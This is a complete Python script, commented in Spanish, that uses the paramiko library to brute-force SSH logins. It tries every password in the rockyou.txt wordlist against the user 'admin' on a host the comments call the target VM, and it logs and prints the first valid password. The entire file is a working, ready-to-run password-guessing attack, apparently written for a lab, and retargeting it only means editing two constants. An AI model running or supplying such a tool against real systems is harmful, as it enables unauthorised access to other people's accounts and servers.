import paramiko
import logging

# Configurar el log para registrar los intentos
logging.basicConfig(filename='ssh_brute.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Parámetros del ataque
HOST = "192.168.1.100"      # IP de la VM objetivo
PORT = 22                   # Puerto SSH
USERNAME = "admin"          # Nombre de usuario objetivo
WORDLIST = "rockyou.txt"  # Archivo de diccionario de contraseñas

def ssh_brute_force():
    with open(WORDLIST, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            logging.info(f"Probando contraseña: {password}")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(HOST, port=PORT, username=USERNAME, password=password, timeout=5)
                logging.info(f"[+] Contraseña válida encontrada: {password}")
                print(f"[+] Contraseña débil encontrada: {password}")
                client.close()
                break  # Detener al encontrar una contraseña válida
            except paramiko.AuthenticationException:
                logging.warning(f"[-] Fallo de autenticación con: {password}")
            except Exception as e:
                logging.error(f"[!] Error inesperado: {str(e)}")
            finally:
                client.close()

if __name__ == "__main__":
    ssh_brute_force()
